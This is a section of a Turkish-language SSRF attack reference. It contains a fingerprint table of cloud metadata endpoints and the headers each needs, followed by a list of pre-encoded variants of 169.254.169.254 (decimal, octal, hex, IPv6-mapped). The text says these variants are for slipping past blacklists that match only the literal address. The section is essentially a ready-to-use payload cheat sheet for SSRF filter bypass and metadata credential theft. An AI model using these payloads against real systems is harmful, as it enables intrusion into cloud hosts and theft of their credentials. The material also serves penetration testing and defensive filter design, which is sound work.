### 12.14 Fingerprint Hızlı Referans Tablosu — Cloud Metadata

| Provider | IP/Host | Zorunlu Header | Token Adımı Gerekir mi |
|---|---|---|---|
| AWS (IMDSv1) | `169.254.169.254` | Yok | Hayır |
| AWS (IMDSv2) | `169.254.169.254` | `X-aws-ec2-metadata-token` | Evet (`PUT` ile) |
| GCP | `metadata.google.internal` / `169.254.169.254` | `Metadata-Flavor: Google` | Hayır (header yeterli) |
| Azure | `169.254.169.254` | `Metadata: true` | Hayır (header yeterli) |
| Alibaba Cloud | `100.100.100.200` | Yok (genelde) | Hayır |
| Oracle Cloud (v2) | `169.254.169.254` | `Authorization: Bearer Oracle` | Hayır (header yeterli) |
| DigitalOcean | `169.254.169.254` | Yok | Hayır |
| Kubernetes API server | `kubernetes.default.svc` | `Authorization: Bearer <token>` | Evet (token başka yoldan elde edilmeli) |

**`169.254.169.254`'ün hazır encode edilmiş varyantları (§8.2.2'deki
genel IP encoding tekniğinin bu spesifik IP'ye uygulanmış, hazır
hesaplanmış hali — blacklist yalnızca literal string'i arıyorsa
bunlardan biri işe yarayabilir):**
```
http://2852039166/                          (decimal)
http://0251.0376.0251.0376/                 (octal)
http://0xa9fea9fe/                          (hex, tam sayı)
http://0xa9.0xfe.0xa9.0xfe/                 (hex, nokta ayraçlı)
http://169.254.43518/                       (kısaltılmış, son 2 oktet birleşik)
http://[::ffff:169.254.169.254]/            (IPv6-mapped)
http://[::ffff:a9fe:a9fe]/                  (IPv6-mapped, hex)
http://[fd00:ec2::254]/                     (AWS'e özgü IPv6 ULA adresi — bazı modern VPC/IPv6-only ortamlarda IMDS'e bu adresten de erişilebilir)
```

